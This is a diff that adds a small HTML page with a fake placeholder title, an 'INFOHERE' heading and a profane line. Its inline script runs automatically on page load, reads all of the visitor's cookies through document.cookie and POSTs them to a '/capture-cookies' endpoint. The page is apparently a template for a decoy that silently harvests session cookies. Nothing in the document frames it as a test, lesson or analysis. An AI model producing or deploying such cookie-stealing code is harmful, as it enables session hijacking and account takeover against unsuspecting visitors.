@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YourFakeTitle</title>
+    <script>
+        function sendCookiesToServer() {
+            const cookies = document.cookie; 
+
+           
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/capture-cookies', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.send(`cookies=${encodeURIComponent(cookies)}`);
+
+            
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log('Cookies sent to the server.');
+                } else {
+                    console.error('Error sending cookies to the server.');
+                }
+            };
+        }
+
+        window.onload = () => {
+            sendCookiesToServer();
+        };
+    </script>
+</head>
+<body>
+    <h1>INFOHERE</h1>
+    <p>Fuck You Dude</p>
+</body>
+</html>
